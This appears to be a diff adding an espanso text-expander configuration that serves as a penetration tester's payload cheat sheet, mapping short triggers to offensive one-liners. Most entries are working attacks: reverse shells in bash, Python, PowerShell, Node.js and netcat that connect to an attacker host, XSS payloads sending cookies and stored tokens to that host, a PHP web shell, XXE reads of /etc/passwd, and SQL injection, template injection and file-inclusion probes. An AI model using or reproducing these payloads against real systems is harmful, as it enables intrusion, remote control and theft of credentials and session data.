@@ -1,0 +1,153 @@
+global_vars:
+  - name: LHOST
+    type: shell
+    params:
+      cmd: ifconfig | awk '/^tun0/ { iface = $1; getline; sub("addr:", ""); print $2 }'
+
+  - name: RHOST
+    type: shell
+    params:
+      cmd: "curl https://ipme.brainmoustache.ca"
+
+  - name: LPORT
+    type: echo
+    params:
+      echo: "7001"
+
+matches:
+  # Simple text replacement
+  - trigger: ":lhost"
+    replace: "{{LHOST}}"
+  - trigger: ":lport"
+    replace: "{{LPORT}}"
+  - trigger: ":rhost"
+    replace: "{{RHOST}}"
+
+  #### Others
+  - trigger: ":msfconsole"
+    replace: sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {{LHOST}}; set LPORT {{LPORT}}; exploit -j"
+
+  - trigger: ":rev_win"
+    replace: rlwrap -cAr nc -lvnp 7001
+
+  - trigger: ":rev_nc"
+    replace: nc -lvnp 7001
+
+  - trigger: ":python_server"
+    replace: "python3 -m http.server 80"
+
+  - trigger: ":nmap_udp"
+    replace: "sudo nmap -sU -oA nmap/nmap_udp"
+
+  - trigger: ":scan_wfuzz"
+    replace: 'sudo wfuzz -c -f wfuzz.vhosts -Z -w gobuster/best-dns-wordlist.txt -u "http://DNS.htb" -H "Host: FUZZ.DNS.htb"'
+
+  - trigger: ":scan_gobuster"
+    replace: "gobuster dir -u http://brainmoustache.ca -w gobuster/directory-list-2.3-medium.txt -o gobuster/root.gobuster-fuzz -x php"
+
+  - trigger: ":curl_linpeas"
+    replace: curl -o linpeas.sh http://{{LHOST}}/linpeas.sh
+
+  - trigger: ":curl_pspy"
+    replace: curl -o pspy32 http://{{LHOST}}/pspy32
+  #### SQL Injection
+  - trigger: ":sqli_poly"
+    replace: 'SLEEP(1) /*'' or SLEEP(1) or ''" or SLEEP(1) or "*/'
+
+  - trigger: ":sqli_basic"
+    replace: "' OR '1'='1#"
+
+  #### LFI
+  - trigger: ":lfi_phpwrapper"
+    replace: php://filter/convert.base64-encode/resource=[file]
+
+  #### SSTI
+  - trigger: ":ssti_basic"
+    replace: "{{7*7}}"
+  - trigger: ":ssti_asp"
+    replace: "@(1+2)"
+  - trigger: ":ssti_el"
+    replace: "${1+1}"
+  - trigger: ":ssti_el-alt"
+    replace: "#{1+1}"
+  - trigger: ":ssti_groovy"
+    replace: '${"http://{{LHOST}}".toURL().text}'
+  - trigger: ":ssti_groovy-alt"
+    replace: '${new URL("http://{{LHOST}}").getText()}'
+  - trigger: ":ssti_jinja"
+    replace: "{{4*4}}[[5*5]]"
+  - trigger: ":ssti_ruby-file"
+    replace: "<%= File.open('/etc/passwd').read %>"
+  - trigger: ":ssti_ruby-dir"
+    replace: "<%= Dir.entries('/') %>"
+  - trigger: ":ssti_smarty"
+    replace: "{$smarty.version}"
+  - trigger: ":ssti_twig"
+    replace: "{{dump(app)}}"
+  - trigger: ":ssti_velocity"
+    replace: '#set($str=$class.inspect("java.lang.String").type)'
+
+  #### XSS
+  - trigger: ":xss_html_basic"
+    replace: "<h1>Brain</h1>"
+
+  - trigger: ":xss_basic"
+    replace: "<script>confirm`1`</script>"
+
+  - trigger: ":xss_img_exfill1"
+    replace: <img src=x onerror=this.src="http://{{LHOST}}/?c="+document.cookie>
+
+  - trigger: ":xss_img_exfill2"
+    replace: <img src="brain" onerror="var i=new Image;i.src='http://{{LHOST}}/somethings?'+localStorage['token']">
+
+  - trigger: ":xss_fetch"
+    replace: "fetch('http://{{LHOST}}', { method: 'POST', mode: 'no-cors', body:document.cookie })"
+
+  #### Web shell
+  - trigger: ":web_php"
+    replace: <?php echo shell_exec($_REQUEST['brain']); ?>
+
+  #### Reverse shell
+  - trigger: ":rev_bash"
+    replace: /bin/bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1
+
+  - trigger: ":rev_python3"
+    replace: export RHOST="{{LHOST}}";export RPORT={{LPORT}};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+
+  - trigger: ":rev_pwsh"
+    replace: powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{{LHOST}}', {{LPORT}});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+
+  - trigger: ":rev_nodejs"
+    replace: require('child_process').exec('nc -e /bin/bash {{LHOST}} {{LPORT}}')
+
+  - trigger: ":rev_ncb"
+    replace: nc {{LHOST}} {{LPORT}} -e /bin/bash
+
+  - trigger: ":rev_ncmk"
+    replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f
+
+  - trigger: ":rev_ncW"
+    replace: nc {{LHOST}} {{LPORT}} -e cmd
+
+  #### XXE
+  - trigger: ":xxe_file"
+    replace: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY brain SYSTEM ''file:///etc/passwd''>]><root>&brain;</root>'
+  - trigger: ":xxe_http"
+    replace: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY brain SYSTEM ''http://{{LHOST}}''>]><root>&brain;</root>'
+
+  #### STTY
+  - trigger: ":stty"
+    replace: /usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash");'
+  - trigger: ":astty"
+    replace: stty raw -echo; fg
+
+  # Print the current date
+  - trigger: ":date"
+    replace: "{{mydate}}"
+    vars:
+      - name: mydate
+        type: date
+        params:
+          format: "%m/%d/%Y"
+
+  # And much more! For more information, visit the docs: https://espanso.org/docs/
